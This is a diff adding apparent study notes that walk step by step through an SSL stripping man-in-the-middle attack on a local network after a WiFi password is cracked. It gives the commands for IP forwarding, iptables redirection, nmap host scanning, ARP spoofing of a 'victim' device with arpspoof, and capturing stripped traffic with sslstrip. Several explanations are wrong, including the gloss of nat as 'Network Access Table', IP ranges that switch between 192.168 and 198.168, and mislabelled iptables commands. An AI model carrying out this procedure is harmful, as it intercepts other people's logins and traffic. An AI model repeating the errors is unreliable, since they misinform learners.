@@ -1,0 +1,39 @@
+1. SSL is Secure Socket Layer
+2. ARP : Address Resolution Protocol
+3. SSL Stripping :
+    - Once WiFi password is cracked, you will be able to see all the network traffic going through that router.
+    - But that data is encrypted because of HTTPS Protocol, hence of no use.
+    - SSL Stripping is converting HTTPS request to HTTP request
+4. `apt-get install sslstrip` : For ssl Stripping
+5. `apt-get install dsniff` : For DNS sniffing
+6. Stripping:
+    - `echo 1 > /proc/sys/net/ipv4/ip_forward` : It enables the interface to allow forwarding network traffice from one port to another.
+                                     To reset to changes, replace '1' with '0'
+    - `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
+        - '-t nat' : -t is flage for specifying table, here we are using nat - Network Access Table
+        - '-A PREROUTING' : -A is flag to append an entry for PREROUTING
+        - '-p tcp' : Which Protocol Layer
+        - '--destination-port 80' : destination port for all the tcp traffic
+        - '-j REDIRECT --to-port 8080' : '-j' indicates the execution command. REDIRECT will redirect all the traffic to port 8080
+    - Verify if the redirection is added to iptables
+        - `iptables -t nat -L PREROUTING` : List all the entries for PREROUTING in nat
+    - `iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT` : Opens the port 8080 for port forwarding
+        - '-I INPUT 1' : Insert the rule at number 1 (any conflicting rules are discarded, hence first rule is the active one)
+        - '-p tcp --dport 8080 -j ACCEPT' : Accept request from 8080 port over tcp Protocol
+    - Verify if the port rule is added to iptables
+        - `iptables -L INPUT` : List all the entries for PREROUTING in nat
+7. Scanning : To get the IP of target (or victim) device
+    - `ifconfig en0` : Look for Get gateway IP of the router.
+        - If your 'inet' show 192.168.1.123, then probably your router IP is 198.168.1.1
+        - It means, available IPs for router is from 198.168.1.2 to 198.168.1.254
+        - Another way is to run `route` command
+    - `nmap 192.168.1.2-254` : scans all the IP between 198.168.1.2 and 198.168.1.254
+        - It will show all the hosts that are up along with the open ports
+8. Spoofing
+    - `arpspoof -i en0 -t 192.168.1.1  -r 192.168.1.121`
+        - '-i en0' : Network interface to use
+        - '-t 192.168.1.1' : Gateway of teh router
+        - '-r 192.168.1.121' : IP address of the victim device (Scanned using nmap)
+9. Start listening:
+    - `sslstrip -l 8080` : Start ssl stripping over port 8080
+    - On another terminal, run `tail -f sslstrip.log` : It will display any realtime changes on sslstrip.log
